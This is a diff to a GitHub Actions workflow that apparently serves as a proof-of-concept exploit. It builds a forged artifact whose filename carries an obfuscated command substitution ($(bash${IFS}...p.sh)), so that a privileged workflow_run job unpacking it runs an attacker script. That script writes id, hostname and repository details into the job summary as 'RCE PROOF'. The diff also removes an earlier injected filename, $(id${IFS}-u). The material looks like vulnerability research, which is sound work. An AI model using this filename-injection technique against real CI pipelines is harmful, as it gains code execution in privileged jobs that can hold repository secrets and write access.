@@ -14,12 +14,13 @@ jobs:
       - name: Craft artifact
         env:
           PR_NUMBER: ${{ github.event.number }}
+          INJECTED_NAME: "$(bash${IFS}$'\\x2f'tmp$'\\x2f'content$'\\x2f'content$'\\x2f'p.sh).txt"
         run: |
           mkdir -p out
           cat > out/p.sh <<'SCRIPT'
           #!/bin/bash
           {
-            echo "### RCE PROOF (forged artifact filename executed)"
+            echo "### RCE PROOF - privileged workflow_run job"
             echo "- id: $(id)"
             echo "- hostname: $(hostname)"
             echo "- repo: $GITHUB_REPOSITORY"
@@ -27,17 +28,14 @@ jobs:
             echo "- event: $GITHUB_EVENT_NAME"
             echo "- run_id: $GITHUB_RUN_ID"
             echo "- job: $GITHUB_JOB"
-            echo "- trigger_workflow: $(jq -r '.workflow_run.name' "$GITHUB_EVENT_PATH" 2>/dev/null)"
-            echo "- trigger_conclusion: $(jq -r '.workflow_run.conclusion' "$GITHUB_EVENT_PATH" 2>/dev/null)"
-            echo "- trigger_run_id: $(jq -r '.workflow_run.id' "$GITHUB_EVENT_PATH" 2>/dev/null)"
+            echo "- event_json_workflow: $(jq -r '.workflow_run.name' "$GITHUB_EVENT_PATH" 2>/dev/null)"
           } >> "$GITHUB_STEP_SUMMARY"
-          echo /tmp/content/content/x
+          echo x
           SCRIPT
           chmod +x out/p.sh
           echo "hello from forged artifact" > out/x.txt
           printf '%s' "$PR_NUMBER" > out/pr_number.txt
-          : > 'out/$(id${IFS}-u).txt'
-          echo "RCE proof: attacker filename executed by bash; privileged comment job continued." > out/1001.txt
+          : > "out/$INJECTED_NAME"
           ls -la out
       - uses: actions/upload-artifact@v4
         with:
